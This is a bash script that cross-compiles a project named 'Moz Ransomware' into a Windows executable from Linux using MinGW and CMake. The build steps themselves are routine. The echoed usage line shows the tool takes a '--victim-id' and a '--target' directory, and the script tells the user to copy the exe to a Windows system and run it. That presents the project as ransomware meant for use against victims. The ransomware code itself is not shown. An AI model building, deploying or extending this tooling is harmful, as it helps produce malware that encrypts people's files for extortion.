#!/usr/bin/env bash
# Simple one-command build for Moz Ransomware Windows .exe from Linux
# Requires: x86_64-w64-mingw32-gcc and x86_64-w64-mingw32-g++ (MinGW-w64)
# Usage: ./build-winexe.sh [output_name]
# Output: moz-win.exe (or specified name) in core/build/

set -e

# Check for MinGW cross-compilers
if ! command -v x86_64-w64-mingw32-gcc &> /dev/null; then
    echo "ERROR: x86_64-w64-mingw32-gcc not found"
    echo "Install with: sudo apt-get install mingw-w64-x86_64-toolchain"
    echo "Or: sudo apt-get install mingw-w64"
    exit 1
fi

if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then
    echo "ERROR: x86_64-w64-mingw32-g++ not found"
    echo "Install with: sudo apt-get install mingw-w64-x86_64-toolchain"
    exit 1
fi

PROJECT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
BUILD_DIR="$PROJECT_DIR/core/build"
OUTPUT_NAME="${1:-moz-win}"

echo "=== Moz Ransomware Windows .exe Builder ==="
echo "Project: $PROJECT_DIR"
echo "Output: $OUTPUT_NAME.exe"
echo ""

# Clean and create build directory
rm -rf "$BUILD_DIR"
mkdir -p "$BUILD_DIR"
cd "$BUILD_DIR"

# Configure with MinGW cross-compilers
echo "Configuring CMake with MinGW cross-compilers..."
cmake -DCMAKE_C_COMPILER=x86_64-w64-mingw32-gcc \
      -DCMAKE_CXX_COMPILER=x86_64-w64-mingw32-g++ \
      -DCMAKE_SYSTEM_NAME=Windows \
      -DCMAKE_EXECUTABLE_SUFFIX=.exe \
      -DCMAKE_SHARED_LIBRARY_SUFFIX=.dll \
      .. 2>&1

if [ $? -ne 0 ]; then
    echo "CMake configuration failed!"
    exit 1
fi

# Build
echo "Building..."
make 2>&1

if [ $? -ne 0 ]; then
    echo "Build failed!"
    exit 1
fi

echo ""
echo "=== Build Complete ==="
echo "Output files in $BUILD_DIR:"
ls -la *.exe *.dll 2>/dev/null || echo "No .exe/.dll found - check the build output above"

echo ""
echo "To run on Windows: copy the .exe to a Windows system and execute"
echo "Usage: ./${OUTPUT_NAME}.exe --victim-id <ID> --target <directory>"